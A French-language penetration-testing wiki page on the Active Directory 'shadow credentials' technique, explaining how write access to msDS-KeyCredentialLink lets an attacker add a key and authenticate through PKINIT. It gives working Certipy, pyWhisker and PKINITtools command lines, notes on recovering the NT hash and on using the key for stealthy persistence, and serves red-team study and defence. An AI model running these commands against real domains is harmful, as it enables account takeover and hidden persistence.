---
order: 6
title: "Shadow credentials : usurpation via les key credentials"
description: "Abuser de l'attribut msDS-KeyCredentialLink pour ajouter des key credentials contrôlés par l'attaquant à un utilisateur ou un ordinateur, puis s'authentifier en tant que ce principal avec des certificats PKINIT sans connaître ni modifier son mot de passe."
keywords:
  - shadow credentials
  - msDS-KeyCredentialLink
  - PKINIT
  - key trust
  - Whisker
---

# Shadow credentials

Windows Hello for Business permet à un compte de s'authentifier avec Kerberos en utilisant une **clé publique** au lieu d'un mot de passe, via PKINIT. L'association est stockée dans l'attribut **`msDS-KeyCredentialLink`** du compte. Si vous pouvez écrire cet attribut, vous pouvez ajouter votre **propre** paire de clés comme identifiant valide pour le compte, puis vous authentifier en tant que lui via PKINIT, sans connaître son mot de passe et sans le modifier. C'est ce dernier point qui rend les shadow credentials préférables à une réinitialisation de mot de passe : la technique est discrète et ne verrouille pas l'utilisateur légitime.

## L'attaque

```bash
# Impacket: add a key credential, then PKINIT to get a TGT (and the NT hash via UnPAC)
certipy shadow auto -u user@example.local -p pass -account 'TARGET$'

# or step by step with pyWhisker / Whisker
pywhisker.py -d example.local -u user -p pass --target 'victim' --action add
# -> produces a certificate; use it with PKINIT
gettgtpkinit.py -cert-pfx cred.pfx example.local/victim victim.ccache
```

Le droit d'écriture sur le `msDS-KeyCredentialLink` de la cible est le prérequis, généralement un constat d'ACL `GenericWrite`/`GenericAll` sur l'objet utilisateur ou ordinateur ([énumération des ACL](../../dacl/acl-enumeration.md)).

## Pourquoi c'est un favori

- La technique transforme une écriture générique sur un objet en **authentification complète** en tant que cet objet, sans réinitialisation de mot de passe nécessaire.
- C'est la manière la plus propre d'abuser d'un objet **ordinateur** inscriptible : ajouter un key credential à `TARGET$`, faire du PKINIT en tant que la machine, puis agir avec sa clé (silver tickets, RBCD).
- PKINIT renvoie un TGT, et la technique [UnPAC-the-hash](unpac-the-hash.md) récupère le **hash NT** du compte depuis ce même échange, convertissant un accès par certificat en un hash réutilisable.

## Notes d'exploitation

- Le domaine doit prendre en charge PKINIT (un contrôleur de domaine avec un certificat / le modèle Key Trust), ce qui est le cas courant dans les environnements AD CS.
- Les shadow credentials sont réversibles : la clé ajoutée peut être retirée ensuite, ce qui en fait aussi un mécanisme de persistance discret.
- La technique se combine directement avec l'abus d'AD CS (section Certificates) et RBCD ; c'est souvent le premier mouvement dès que BloodHound montre une écriture sur un objet privilégié.

## Outils

- **Certipy** (`shadow auto`) : ajout de key credential de bout en bout, plus PKINIT et récupération du hash.
- **Whisker / pyWhisker** : ajouter/lister/supprimer les entrées `msDS-KeyCredentialLink`.
- **PKINITtools** (`gettgtpkinit.py`, `getnthash.py`) : TGT PKINIT et UnPAC.

## Références

- [SpecterOps: Shadow Credentials (Elad Shamir)](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Whisker (eladshamir)](https://github.com/eladshamir/Whisker)
- [Certipy (ly4k): shadow and PKINIT](https://github.com/ly4k/Certipy)
